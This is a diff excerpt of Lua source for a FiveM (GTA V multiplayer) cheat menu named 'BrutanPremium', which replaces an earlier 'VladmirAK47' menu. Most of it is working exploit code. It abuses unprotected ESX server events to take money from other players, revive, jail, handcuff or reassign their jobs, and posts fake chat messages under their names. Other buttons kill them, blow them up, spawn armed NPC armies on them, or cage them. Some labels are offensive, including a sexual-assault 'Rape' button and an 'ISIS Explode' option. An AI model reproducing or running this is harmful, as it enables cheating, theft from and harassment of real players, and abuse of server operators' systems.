+                                local ped1 = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true, false)
+                                assped = ped
+                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
+                                    GiveWeaponToPed(pas, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
+                                    GiveWeaponToPed(pas1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
+                                    GiveWeaponToPed(ped, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
+                                    GiveWeaponToPed(ped1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
+                                    SetPedIntoVehicle(ped, v, -1)
+                                    SetPedIntoVehicle(ped1, v1, -1)
+                                    SetPedIntoVehicle(pas, v, 0)
+                                    SetPedIntoVehicle(pas1, v1, 0)
+                                    TaskVehicleEscort(ped1, v1, target, -1, 50.0, 1082917029, 7.5, 0, -1)
+                                    asstarget = target
+                                    TaskVehicleEscort(ped, v, target, -1, 50.0, 1082917029, 7.5, 0, -1)
+                                    SetDriverAbility(ped, 10.0)
+                                    SetDriverAggressiveness(ped, 10.0)
+                                    SetDriverAbility(ped1, 10.0)
+                                    SetDriverAggressiveness(ped1, 10.0)
+                                end
+                            end
+                        end
+                    end
+                end)
+                    elseif BrutanPremium.Button("Kick From Vehicle") then
+                        ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
+                        drawNotification("~g~Kicked Player From Vehicle!")
+					elseif BrutanPremium.Button("Kill Player") then
+					SetEntityHealth(GetPlayerPed(SelectedPlayer), 0)
+					SetEntityHealth(GetPlayerPedId(SelectedPlayer), 0)
+                    elseif BrutanPremium.Button("Spawn Flare On Player") then
+                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                        ShootSingleBulletBetweenCoords(coords.x, coords.y , coords.z, coords.x, coords.y, coords.z, 100, true, GetHashKey("WEAPON_FLAREGUN"), PlayerPedId(), true, true, 100)
+                    elseif BrutanPremium.Button("Spawn Smoke On Player") then
+                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                        ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z, coords.x, coords.y, coords.z, 100, true, GetHashKey("WEAPON_SMOKEGRENADE"), GetPlayerPed(SelectedPlayer), true, true, 100)
+                    end
+
+                    BrutanPremium.Display()
+                elseif BrutanPremium.IsMenuOpened("PlayerESXMenu") then
+                    if BrutanPremium.MenuButton("~r~→  ~s~ESX Triggers", "PlayerESXTriggerMenu") then
+                    elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Jobs", "PlayerESXJobMenu") then
+                    end
+
+                    BrutanPremium.Display()
+                elseif BrutanPremium.IsMenuOpened("PlayerESXTriggerMenu") then
+                    if BrutanPremium.Button("ESX Revive") then
+					TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(SelectedPlayer))
+                    TriggerServerEvent("esx_ambulancejob:revive",GetPlayerServerId(selectedPlayer),GetPlayerServerId(selectedPlayer))
+					TriggerServerEvent("whoapd:revive", GetPlayerServerId(SelectedPlayer))
+				    TriggerServerEvent("paramedic:revive", GetPlayerServerId(SelectedPlayer))
+				    TriggerServerEvent("ems:revive", GetPlayerServerId(SelectedPlayer))
+					local ax = GetPlayerPed(SelectedPlayer)
+                    local bK = GetEntityCoords(ax)
+                    TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
+                    local dZ = {
+                        x = ESX.Math.Round(bK.x, 1),
+                        y = ESX.Math.Round(bK.y, 1),
+                        z = ESX.Math.Round(bK.z, 1)
+                    }
+                    StopScreenEffect('DeathFailOut')
+                    DoScreenFadeIn(800)
+					elseif BrutanPremium.Button("Fire player from job (~g~ESX~s~)") then
+				    FirePlayer(SelectedPlayer)
+                    elseif BrutanPremium.Button("ESX Give Money To Player From Your Wallet") then
+                        local d = KeyboardInput("Enter amount of money to give","",100)
+                        if d ~= "" then
+                            TriggerServerEvent("esx:giveInventoryItem",GetPlayerServerId(selectedPlayer),"item_money","money",d)
+                        end
+                    elseif BrutanPremium.Button("ESX Steal Money From Player") then
+                        local d=KeyboardInput("Enter amount of money to steal","",100)
+                        if d ~= "" then
+                            TriggerServerEvent("esx:removeInventoryItem",GetPlayerServerId(selectedPlayer),"item_money","money",d)
+                        end
+                    elseif BrutanPremium.Button("ESX Handcuff Player") then
+                        TriggerServerEvent("esx_policejob:handcuff",GetPlayerServerId(selectedPlayer))
+                    elseif BrutanPremium.Button("ESX Send To Jail") then
+                        TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(selectedPlayer),5000,"Jailed")
+                           TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
+                           TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
+                        TriggerServerEvent("js:jailuser",GetPlayerServerId(selectedPlayer),45*60,"Jailed")
+                    elseif BrutanPremium.Button("ESX Get Out Of Jail") then
+                        local ped = selectedPlayer
+                        TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
+                        TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
+                        TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(ped),0)
+                        TriggerServerEvent("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
+                    end
+
+                    BrutanPremium.Display()
+                elseif BrutanPremium.IsMenuOpened("PlayerESXJobMenu") then
+                    if BrutanPremium.Button("Unemployed") then
+                        TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(selectedPlayer))
+                    elseif BrutanPremium.Button("Police") then
+                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"police",3)
+                    elseif BrutanPremium.Button("Mechanic") then
+                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"mecano",3)
+                    elseif BrutanPremium.Button("Taxi") then
+                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"taxi",3)
+                    elseif BrutanPremium.Button("Ambulance") then
+                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"ambulance",3)
+                    elseif BrutanPremium.Button("Real Estate Agent") then
+                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"realestateagent",3)
+                    elseif BrutanPremium.Button("Car Dealer") then
+                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"cardealer",3)
+                    end
+
+
+                    BrutanPremium.Display()
+                elseif BrutanPremium.IsMenuOpened("PlayerTrollMenu") then
+                    if BrutanPremium.Button ("Fake Chat Message") then
+                        local cX=KeyboardInput("Enter message to send","",100)
+                        local cY=GetPlayerName(selectedPlayer)
+                        if cX then
+                            TriggerServerEvent("_chat:messageEntered",cY,{0,0x99,255},cX)
+                        end
+				elseif BrutanPremium.Button("Ram w/ Custom Vehicle") then
+				local cPs = KeyboardInput('Are you sure you want to ram the player? y/n', '', 0)
+				if cPs == 'y' then
+						local ModelName1 = KeyboardInput("Enter Vehicle Name", "", 100)
+				        if ModelName1 and IsModelValid(ModelName1) and IsModelAVehicle(ModelName1) then
+                        local model = GetHashKey(ModelName1)
+                        RequestModel(model)
+                        while not HasModelLoaded(model) do
+                            Citizen.Wait(0)
+                        end
+                        local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
+                        if HasModelLoaded(model) then
+                            local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)	
+                            SetVehicleForwardSpeed(veh, 120.0)		
+                        end		
+											                    else
+                        drawNotification("~r~Model Isn't Valid You Tard")
+						end
+						elseif cPs == 'n' then
+                        drawNotification(
+                            '~h~~r~Operation cancelled~s~.'
+                        )
+					    else
+                        drawNotification(
+                            '~h~~r~Invalid Confirmation~s~.'
+                        )
+                        drawNotification(
+                            '~h~~r~Operation cancelled~s~.'
+                        )
+                    end
+				elseif BrutanPremium.Button('~y~Explode ~s~Vehicle') then
+                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
+                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
+                    else
+                        av('~h~~b~Player not in a vehicle~s~.', false)
+                    end
+                elseif BrutanPremium.Button('~r~Banana ~p~Party') then
+                    local bH = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
+                    local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
+                    local bJ = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
+                    AttachEntityToEntity(
+                        bH,
+                        GetPlayerPed(SelectedPlayer),
+                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
+                        0.4,
+                        0,
+                        0,
+                        0,
+                        270.0,
+                        60.0,
+                        true,
+                        true,
+                        false,
+                        true,
+                        1,
+                        true
+                    )
+                    AttachEntityToEntity(
+                        bI,
+                        GetPlayerPed(SelectedPlayer),
+                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
+                        0.4,
+                        0,
+                        0,
+                        0,
+                        270.0,
+                        60.0,
+                        true,
+                        true,
+                        false,
+                        true,
+                        1,
+                        true
+                    )
+                    AttachEntityToEntity(
+                        bJ,
+                        GetPlayerPed(SelectedPlayer),
+                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
+                        0.4,
+                        0,
+                        0,
+                        0,
+                        270.0,
+                        60.0,
+                        true,
+                        true,
+                        false,
+                        true,
+                        1,
+                        true
+                    )
+                elseif BrutanPremium.Button('~r~ISIS Explode') then
+                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0)
+                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true)
+				elseif BrutanPremium.Button("Small invisible Explosion") then
+                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
+                elseif BrutanPremium.Button('~r~Rape') then
+                    RequestModelSync('a_m_o_acult_01')
+                    RequestAnimDict('rcmpaparazzo_2')
+                    while not HasAnimDictLoaded('rcmpaparazzo_2') do
+                        Citizen.Wait(0)
+                    end
+                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
+                        local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
+                        while not NetworkHasControlOfEntity(veh) do
+                            NetworkRequestControlOfEntity(veh)
+                            Citizen.Wait(0)
+                        end
+                        SetEntityAsMissionEntity(veh, true, true)
+                        DeleteVehicle(veh)
+                        DeleteEntity(veh)
+                    end
+                    count = -0.2
+                    for b = 1, 3 do
+                        local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
+                        local bS = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
+                        SetEntityAsMissionEntity(bS, true, true)
+                        AttachEntityToEntity(
+                            bS,
+                            GetPlayerPed(SelectedPlayer),
+                            4103,
+                            11816,
+                            count,
+                            0.00,
+                            0.0,
+                            0.0,
+                            0.0,
+                            0.0,
+                            false,
+                            false,
+                            false,
+                            false,
+                            2,
+                            true
+                        )
+                        ClearPedTasks(GetPlayerPed(SelectedPlayer))
+                        TaskPlayAnim(
+                            GetPlayerPed(SelectedPlayer),
+                            'rcmpaparazzo_2',
+                            'shag_loop_poppy',
+                            2.0,
+                            2.5,
+                            -1,
+                            49,
+                            0,
+                            0,
+                            0,
+                            0
+                        )
+                        SetPedKeepTask(bS)
+                        TaskPlayAnim(bS, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
+                        SetEntityInvincible(bS, true)
+                        count = count - 0.4
+                    end
+                elseif BrutanPremium.Button('~r~Cage ~s~Player') then
+                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
+                    roundx = tonumber(string.format('%.2f', x))
+                    roundy = tonumber(string.format('%.2f', y))
+                    roundz = tonumber(string.format('%.2f', z))
+                    local e7 = 'prop_fnclink_05crnr1'
+                    local e8 = GetHashKey(e7)
+                    RequestModel(e8)
+                    while not HasModelLoaded(e8) do
+                        Citizen.Wait(0)
+                    end
+                    local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
+                    local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
+                    SetEntityHeading(e9, -90.0)
+                    SetEntityHeading(ea, 90.0)
+                    FreezeEntityPosition(e9, true)
+                    FreezeEntityPosition(ea, true)
+                elseif BrutanPremium.Button('Wall ~s~Player') then
+                    local eb = 'xs_prop_hamburgher_wl'
+                    local ec = -145066854
+                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                    AttachEntityToEntity(
+                        ed,
+                        GetPlayerPed(SelectedPlayer),
+                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
+                        0,
+                        0,
+                        -1.0,
+                        0.0,
+                        0.0,
+                        0,
+                        true,
+                        true,
+                        false,
+                        true,
+                        1,
+                        true
+                    )
+                elseif BrutanPremium.Button('Wall ~s~Player Car') then
+                    local eb = 'xs_prop_hamburgher_wl'
+                    local ec = -145066854
+                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                    AttachEntityToEntity(
+                        ed,
+                        GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false),
+                        GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 'chassis'),
+                        0,
+                        0,
+                        -1.0,
+                        0.0,
+                        0.0,
+                        0,
+                        true,
+                        true,
+                        false,
+                        true,
+                        1,
+                        true
+                    )
+                elseif BrutanPremium.Button('Fuck Up ~s~Player') then
+                    j = true
+                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
+                    roundx = tonumber(string.format('%.2f', x))
+                    roundy = tonumber(string.format('%.2f', y))
+                    roundz = tonumber(string.format('%.2f', z))
+                    local ee = 'sr_prop_spec_tube_xxs_01a'
+                    local ef = GetHashKey(ee)
+                    RequestModel(ef)
+                    RequestModel(smashhash)
+                    while not HasModelLoaded(ef) do
+                        Citizen.Wait(0)
+                    end
+                    local eg = CreateObject(ef, roundx, roundy, roundz - 5.0, true, true, false)
+                    SetEntityRotation(eg, 0.0, 90.0, 0.0)
+                    local eh = -356333586
+                    local bR = 'WEAPON_SNOWBALL'
+                    for i = 0, 10 do
+                        local bK = GetEntityCoords(eg)
+                        RequestModel(eh)
+                        Citizen.Wait(50)
+                        if HasModelLoaded(eh) then
+                            local ped =
+                                CreatePed(
+                                21,
+                                eh,
+                                bK.x + math.sin(i * 2.0),
+                                bK.y - math.sin(i * 2.0),
+                                bK.z - 5.0,
+                                0,
+                                true,
+                                true
+                            ) and
+                                CreatePed(
+                                    21,
+                                    eh,
+                                    bK.x - math.sin(i * 2.0),
+                                    bK.y + math.sin(i * 2.0),
+                                    bK.z - 5.0,
+                                    0,
+                                    true,
+                                    true
+                                )
+                            NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+                                Citizen.Wait(500)
+                                NetToPed(ei)
+                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                SetCurrentPedWeapon(ped, GetHashKey(bR), true)
+                                SetEntityInvincible(ped, true)
+                                SetPedCanSwitchWeapon(ped, true)
+                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        end
+                    end
+				elseif BrutanPremium.Button("Spawn Mountain Lion") then
+                    local mtlion = "A_C_MtLion"
+                    for i = 0, 10 do
+                        local co = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                        RequestModel(GetHashKey(mtlion))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(mtlion)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
+                            NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+                                Citizen.Wait(50)
+                                NetToPed(ei)
+                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        end
+                    end
+                elseif BrutanPremium.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then
+                    local bQ = "s_m_y_swat_01"
+                    local bR = "WEAPON_ASSAULTRIFLE"
+                    for i = 0, 10 do
+                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                        RequestModel(GetHashKey(bQ))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(bQ)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
+                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
+                            NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+                                Citizen.Wait(50)
+                                NetToPed(ei)
+                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                SetEntityInvincible(ped, true)
+                                SetPedCanSwitchWeapon(ped, true)
+                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        end
+                    end
+					elseif BrutanPremium.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
+                    local bQ = "s_m_y_swat_01"
+                    local bR = "weapon_rpg"
+                    for i = 0, 10 do
+                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                        RequestModel(GetHashKey(bQ))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(bQ)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
+                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
+                            NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+                                Citizen.Wait(50)
+                                NetToPed(ei)
+                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                SetEntityInvincible(ped, true)
+                                SetPedCanSwitchWeapon(ped, true)
+                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        end
+                    end
+					
+                elseif BrutanPremium.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
+                    local bQ = "s_m_y_swat_01"
+                    local bR = "weapon_flaregun"
+                    for i = 0, 10 do
+                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                        RequestModel(GetHashKey(bQ))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(bQ)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
+                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
+                            NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+                                Citizen.Wait(50)
+                                NetToPed(ei)
+                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                SetEntityInvincible(ped, true)
+                                SetPedCanSwitchWeapon(ped, true)
+                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        end
+                    end
+                elseif BrutanPremium.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
+                    local bQ = "s_m_y_swat_01"
+                    local bR = "weapon_railgun"
+                    for i = 0, 10 do
+                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                        RequestModel(GetHashKey(bQ))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(bQ)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
+                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
+                            NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+                                Citizen.Wait(50)
+                                NetToPed(ei)
+                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                SetEntityInvincible(ped, true)
+                                SetPedCanSwitchWeapon(ped, true)
+                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        end
+                    end
+					elseif BrutanPremium.Button("Rain Agressive NPC") then
+                    local bQ = "mp_f_cocaine_01"
+					local bR = "weapon_knife"
+					for i = 0, 10 do
+                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                        RequestModel(GetHashKey(bQ))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(bQ)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, true, true)
+							NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+                                Citizen.Wait(50)
+                                NetToPed(ei)
+								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                SetEntityInvincible(ped, true)
+								SetPedCanSwitchWeapon(ped, true)
+                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+						end
+                    end
+                    elseif BrutanPremium.MenuButton("~r~→  ~s~Spawn Props On Player", "SpawnPropsMenu") then
+                    elseif BrutanPremium.CheckBox(
+                        "Freeze Player",
+                        freezePlayer,
+                        function(enabled)
+                            freezePlayer = enabled
+                        end)
+                    then
+                    end
+
+                    BrutanPremium.Display()
+                elseif BrutanPremium.IsMenuOpened("SpawnPropsMenu") then
+                    if BrutanPremium.CheckBox(
+                        "Attach Prop To Player",
+                        attachProp,
+                        function(enabled)
+                            attachProp = enabled
+                        end)
+                    then
+                    elseif BrutanPremium.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
+                        currentBone = currentIndex
+                        selectedBone = selectedIndex
+                    end)
+                    then
+                    elseif BrutanPremium.Button("Weed") then
+                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
+                        local obj = CreateObject(GetHashKey("prop_weed_01"),coords.x,coords.y,coords.z,true,true,true)
+                        if attachProp then
+                            if selectedBone == 1 then
+                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
+                            elseif selectedBone == 2 then
+                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
+                            end
+                        end
+                    elseif BrutanPremium.Button("UFO") then
+                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
+                        local obj = CreateObject(GetHashKey("p_spinning_anus_s"),coords.x,coords.y,coords.z,true,true,true)
+                        if attachProp then
+                            if selectedBone == 1 then
+                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
+                            elseif selectedBone == 2 then
+                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
+                            end
+                        end
+                    elseif BrutanPremium.Button("Windmill") then
+                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
+                        local obj = CreateObject(GetHashKey("prop_windmill_01"),coords.x,coords.y,coords.z,true,true,true)
+                        if attachProp then
+                            if selectedBone == 1 then
+                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),39317),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
+                            elseif selectedBone == 2 then
+                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
+                            end
+                        end
+                    elseif BrutanPremium.Button("Custom Prop") then
+                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
+                        local input = KeyboardInput("Enter Prop Name", "", 100)
+                        if IsModelValid(input) then
+                            local obj = CreateObject(GetHashKey(input),coords.x,coords.y,coords.z,true,true,true)
+                            if attachProp then
+                                if selectedBone == 1 then
+                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
+                                elseif selectedBone == 2 then
+                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
+                                end
+                            end
+                        else
+                            drawNotification("Invalid Model!")
+                        end
+                    end
+
+                    BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("VehicleRamMenu") then
+                if BrutanPremium.Button("Futo") then
+                    local model = GetHashKey("futo")
+                    RequestModel(model)
+                    while not HasModelLoaded(model) do
+                        Citizen.Wait(0)
+                    end
+                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
+                    if HasModelLoaded(model) then
+                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
+                        SetVehicleForwardSpeed(veh, 120.0)
+                    end
+                elseif BrutanPremium.Button("Bus") then
+                    local model = GetHashKey("bus")
+                    RequestModel(model)
+                    while not HasModelLoaded(model) do
+                        Citizen.Wait(0)
+                    end
+                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
+                    if HasModelLoaded(model) then
+                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
+                        SetVehicleForwardSpeed(veh, 120.0)
                     end
                 end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('MVE') then 
-                if VladmirAK47.Button('~h~MiniGun Pro') then
-                      --EquipSkateboard()
-					  StartSkating1()
-					  av('~h~~b~Press "HOME" for effect, to stop press E', false) 					  
-                  		Noclip1 = true			  
-                end				
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('Minigun Pro') then
-                local veh = GetVehiclePedIsUsing(PlayerPedId())
-                if VladmirAK47.MenuButton('~h~~p~▶~s~ ~h~Exterior ~s~Tuning', 'tunings') then
